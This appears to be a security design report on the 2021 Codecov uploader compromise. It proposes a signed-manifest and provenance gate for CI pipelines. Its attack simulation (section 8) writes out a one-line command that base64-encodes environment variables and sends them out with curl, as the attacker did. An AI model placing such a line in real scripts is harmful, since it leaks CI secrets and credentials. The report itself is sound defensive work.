### 1. Original Vulnerability Analysis

In April 2021, an attacker exploited an unauthorized HMAC credential associated with a Google Cloud Storage (GCS) service account belonging to Codecov. The attacker modified the canonical distribution of the `bash` uploader script stored in a public bucket. Because millions of developers executed `curl -s https://codecov.io/bash | bash` directly inside their automated continuous integration environments, the malicious script harvested sensitive environment variables (CI secrets, cloud credentials, tokens, and private Git URLs) and exfiltrated them to an attacker-controlled endpoint.

The core vulnerability was **not** a lack of network transport security; the file was served legitimately over HTTPS with valid TLS certificates. Rather, the vulnerability was the **absence of end-to-end artifact authenticity and integrity verification**. Downstream customer pipelines placed implicit trust in the hosting server. Customers assumed that if a file arrived over HTTPS from `codecov.io`, it must be authentic. Furthermore, while Codecov published SHA-256 hashes, hash verification was voluntary, manual, and insufficient because a compromised distribution bucket allows an attacker to update both the script and the plaintext hash simultaneously.

---

### 2. Security Requirements

To permanently neutralize this vulnerability, the system enforces five non-negotiable security requirements:

1. **Deterministic Integrity Verification:** Every artifact must possess an unalterable cryptographic fingerprint calculated using SHA-256. Any single-bit change must trigger immediate rejection.
2. **Asymmetric Origin Authenticity:** Artifacts must be signed using the vendor's private key via an asymmetric digital signature algorithm (Ed25519). Consumers verify the signature using the vendor's trusted public key.
3. **Decoupling Transport from Artifact Trust:** Trust must reside within the cryptographic signature of the artifact itself, rather than in the transport channel (TLS) or the hosting server (S3/GCS/CDN).
4. **Dynamic Key Lifecycle & Revocation Control:** Verification must query a trusted Key Revocation List (CRL) to instantly invalidate signatures generated by leaked, expired, or decommissioned keys.
5. **Automated Zero-Trust Admission Gating:** The verification procedure must be embedded directly within customer CI/CD pipelines, automatically aborting execution (`BLOCK`) with a non-zero exit code if verification fails.

---

### 3. Proposed Security Architecture

The proposed solution implements a **Cryptographically Verified Software Supply Chain** comprising two distinct security zones:

```
[VENDOR SECURE ZONE]
  Developer -> Source Repository -> Hermetic Build -> Security Tests -> SHA-256 Digest
            -> SLSA Provenance Generation -> HSM / KMS Signed Manifest (Ed25519)
                                |
[UNTRUSTED DISTRIBUTION TIER]   v
  Object Storage / CDN / Mirror (GCS / AWS S3 / Cloudflare)
                                |
[CUSTOMER ZERO-TRUST CI GATE]   v
  Customer Pipeline -> Pull Artifact + Manifest + Provenance
                    -> Check Key Status in CRL
                    -> Verify Ed25519 Manifest Signature
                    -> Recalculate SHA-256 Digest
                    -> Evaluate Security Policy & SLSA Provenance
                    -> DECISION: DEPLOY (Exit 0) or BLOCK (Exit 1)
                    -> Tamper-Evident Audit Logging (SQLite)
```

The consumer never trusts the storage bucket. The artifact is validated against the vendor root of trust locally before it is granted execution rights.

### 5. Cryptographic Design and Protocol Analysis

#### 5.1 Artifact Integrity: SHA-256 (FIPS 180-4)
- **Mathematical Function:** Cryptographic one-way hash function mapping variable-length input $M$ to a 256-bit digest $H(M)$.
- **Collision Resistance:** Finding $M_1 \neq M_2$ such that $H(M_1) = H(M_2)$ requires $2^{128}$ operations (Birthday Paradox).
- **Pre-image Resistance:** Given digest $h$, computing $M$ requires $2^{256}$ operations.
- **Clarification:** SHA-256 guarantees *integrity* (fingerprint) only. It does **not** provide *authenticity* because an attacker who modifies an artifact can trivially recompute and update an unsigned SHA-256 hash.

#### 5.2 Asymmetric Authenticity: Ed25519 (RFC 8032)
- **Mathematical Basis:** Edwards-curve Digital Signature Algorithm (EdDSA) over Curve25519 using twisted Edwards curve:
  $$-x^2 + y^2 = 1 - \frac{121665}{121666} x^2 y^2$$
  over the finite field $\mathbb{F}_{2^{255}-19}$.
- **Security Properties:** 128-bit security level, immune to side-channel timing attacks, resilient to signature malleability, fast signature generation and verification.
- **Key Separation:** Vendor retains private scalar $k \in \mathbb{F}_q$; customers only receive public group point $A = k \cdot B$. The private key is never distributed.

#### 5.3 Transport Security: TLS 1.3
- **Role:** Protects network transmission channel between storage endpoints and consumers against eavesdropping.
- **Distinction:** TLS secures the *pipe*, while Ed25519 signs the *payload*. TLS cannot detect if an artifact was tampered with prior to transmission (e.g. at rest in the storage bucket).

### 6. Key Management Lifecycle

1. **Key Generation:** High-entropy generation using OS CSPRNG (`os.urandom` / `cryptography.hazmat`).
2. **Private Key Protection:** In development, keys are stored in PKCS#8 encrypted PEM format. In enterprise production, signing keys reside exclusively within a FIPS 140-2 Level 3 certified Hardware Security Module (HSM) or Cloud KMS (e.g., AWS KMS, Google Cloud KMS, HashiCorp Vault Transit). Private keys never leave the hardware boundary.
3. **Key Identifiers:** Each key pair is assigned an immutable alphanumeric identifier (`key_id`, e.g., `vendor_primary_v1`) accompanied by a SHA-256 fingerprint of the SubjectPublicKeyInfo DER encoding.
4. **Key Revocation:** Maintained via an authenticated Key Revocation List (`revoked_keys.json`), containing revoked key IDs, revocation timestamps, and reason codes. Verifiers query this status before accepting signatures.
5. **Key Rotation:** Periodic rotation protocol where a new key pair is generated, authorized in customer policy, and the retired key is transitioned to the CRL.

### 7. CI/CD Integration

The verification engine integrates seamlessly into standard CI/CD pipelines (e.g. GitHub Actions, GitLab CI, Jenkins):

```yaml
# Example Customer CI/CD Pipeline Integration (.github/workflows/ci.yml)
- name: Download Vendor Uploader
  run: |
    curl -sO https://dist.vendor.com/uploader.sh
    curl -sO https://dist.vendor.com/uploader.sh.manifest.json

- name: Cryptographic Supply Chain Security Gate
  run: |
    python -m ci.security_gate --artifact uploader.sh --manifest uploader.sh.manifest.json

- name: Execute Verified Uploader
  run: bash uploader.sh
```

If any check fails, the gate exits with code 1, automatically terminating the pipeline before the script can execute.

### 8. Attack Simulation & Mitigation Proof

Four distinct real-world attack scenarios were implemented and validated:

1. **Scenario 1 — Legitimate Release:** Standard vendor build -> verified -> allowed (`PASS`, Latency: 4.29 ms).
2. **Scenario 2 — Storage Compromise (Codecov Replica):** An attacker compromises distribution storage and appends a single line exfiltrating environment variables (`curl -s .../?$(env | base64)`).  
   *Result:* Gate detects SHA-256 discrepancy (`HASH_MISMATCH`), halts execution, logs security alert (`BLOCKED`).
3. **Scenario 3 — Rogue Key Signing:** An attacker with a modified artifact generates an unauthorized Ed25519 keypair and signs the manifest.  
   *Result:* Customer admission policy flags unrecognized Key ID (`UNAUTHORIZED_KEY`), blocking execution (`BLOCKED`).
4. **Scenario 4 — Version Downgrade / Replay:** An attacker attempts to trick the customer into deploying an obsolete, known-vulnerable release (`0.8.0`).  
   *Result:* Monotonic policy rejects version downgrade (`VERSION_REPLAY_BLOCKED`).

### 10. Innovation Beyond Basic Hash Checking

Traditional defenses rely on static hash checking, which fails when distribution servers or CDN mirrors are compromised. This project introduces the **Continuous Software Supply Chain Security Gate** featuring:
1. **Multi-Layered Verification:** Combines content hashing (SHA-256), cryptographic origin authentication (Ed25519), and dynamic key status checking (CRL).
2. **SLSA Level 2+ Provenance Binding:** Binds artifacts cryptographically to the exact source Git commit, builder enclave ID, and dependency hashes.
3. **Canonical Manifest Encoding (RFC 8785):** Eliminates serialization discrepancies across platforms, ensuring byte-exact cryptographic validation.
4. **Tamper-Evident Persistent Audit Ledger:** Every check, timestamp, and diagnostic trace is committed to an append-only SQLite database.

---

### 11. Limitations

1. **CRL Distribution Latency:** In our local prototype, the CRL is fetched from a shared directory or endpoint. In global enterprise deployments, CRL synchronization can introduce minor propagation delays (mitigated in production via OCSP or Sigstore Rekor).
2. **Build Enclave Trust:** While provenance guarantees that the build occurred on a registered worker, it assumes the underlying build runner OS was not root-compromised prior to compilation (mitigated in production via reproducible hermetic builds and confidential computing enclaves).

---

### 12. Real-World Feasibility & Industry Alignment

The architecture directly aligns with state-of-the-art industry standards:
- **Sigstore (Cosign / Rekor):** Uses ephemeral keys and OIDC identity providers to sign container images and artifacts.
- **SLSA (Supply-chain Levels for Software Artifacts):** Implements Level 2+ provenance attestation.
- **The Update Framework (TUF):** Provides key rotation, root key pinning, and protection against replay attacks.

The implementation is lightweight, requires minimal compute (~4 ms per check), requires no external proprietary infrastructure, and provides a mathematically verifiable security guarantee against Codecov-style supply chain attacks.
